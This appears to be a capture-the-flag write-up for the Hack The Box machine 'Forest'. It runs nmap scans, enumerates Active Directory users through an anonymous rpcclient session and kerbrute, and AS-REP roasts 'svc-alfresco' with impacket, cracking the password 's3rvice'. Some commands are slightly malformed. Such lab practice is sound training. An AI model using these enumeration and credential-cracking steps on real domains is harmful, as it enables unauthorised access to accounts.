##### nmap

All port scan
```bash
sudo nmap -n -sT -Pn -p- -T5 10.10.10.161 -v -oA nmap2
```
```
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49668/tcp open  unknown
49670/tcp open  unknown
49676/tcp open  unknown
49677/tcp open  unknown
49684/tcp open  unknown
49706/tcp open  unknown
49964/tcp open  unknown
```

Service scan
```bash
sudo nmap -sC -sV 10.10.10.161 -p 53,88,135,139,389,445,464,593,636,3269,5985,9389,47001,49664,49665,49666,49668,49670,49676,49677,49684,49706,49964 -v -oA nmap
```
```
PORT      STATE SERVICE      VERSION
53/tcp    open  domain       Simple DNS Plus
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2024-09-10 16:12:57Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3269/tcp  open  tcpwrapped
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf       .NET Message Framing
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49668/tcp open  msrpc        Microsoft Windows RPC
49670/tcp open  msrpc        Microsoft Windows RPC
49676/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc        Microsoft Windows RPC
49684/tcp open  msrpc        Microsoft Windows RPC
49706/tcp open  msrpc        Microsoft Windows RPC
49964/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2024-09-10T09:13:49-07:00
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2024-09-10T16:13:48
|_  start_date: 2024-09-09T12:49:08
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
|_clock-skew: mean: 2h26m49s, deviation: 4h02m30s, median: 6m48s
```
##### manual

- used RPCclient to enumerate domain users
```bash
rpcclient 'U '' -N 10.10.10.161
rpcclient $> enumdomusers
```
Saved all enumerated users in `users.txt`
```
sebastien
lucinda
svc-alfresco
andy
mark
santi
Administrator
```

- Ran kerbrute after enumerating users on the system
```bash
kerbrute -domain htb.local -dc-ip 10.10.10.161 -users user.txt -t 100
```
```
[*] Valid user => santi
[*] Valid user => lucinda
[*] Valid user => svc-alfresco [NOT PREAUTH]
[*] Valid user => mark
[*] Valid user => sebastien
[*] Valid user => Administrator
[*] Valid user => andy
[*] No passwords were discovered :'(
```
It looks like user `svc-alfresco` does not have PREAUTH enabled. This can be used to get TGT for the user using `impacket-GetNPUsers`
```bash
impacket-GetNPUsers htb.local/svc-alfresco -dc-ip 10.10.10.161 -no-pass
```
![[Pasted image 20240910203252.png]]

- Cracked the password using hashcat and found the user to be `s3rvice`
